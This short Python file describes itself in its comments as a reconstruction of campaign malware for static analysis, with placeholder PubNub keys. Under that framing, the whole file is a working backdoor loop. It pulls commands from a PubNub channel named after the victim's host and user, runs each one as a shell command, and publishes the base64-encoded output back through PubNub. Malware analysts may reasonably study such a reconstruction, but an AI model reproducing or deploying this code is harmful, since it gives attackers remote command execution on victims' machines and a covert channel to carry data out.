# Representative Type A transport reconstruction, not recovered campaign code.
# Placeholder PubNub keys are deliberately nonfunctional. Static analysis only.
import base64
import getpass
import json
import socket
import subprocess
import urllib.parse
import httpx

channel = socket.gethostname() + '-' + getpass.getuser()
cursor = '0'
while True:
    response = httpx.get('https://ps.pndsn.com/subscribe/sub-c-fixture/' + channel + '/0/' + cursor, timeout=60).json()
    cursor = response[1]
    if response[0]:
        output = subprocess.check_output(response[0][0], shell=True)
        encoded = base64.b64encode(output).decode('ascii')
        message = urllib.parse.quote(json.dumps(encoded), safe='')
        httpx.get('https://ps.pndsn.com/publish/pub-c-fixture/sub-c-fixture/0/' + channel + '/0/' + message, timeout=30)
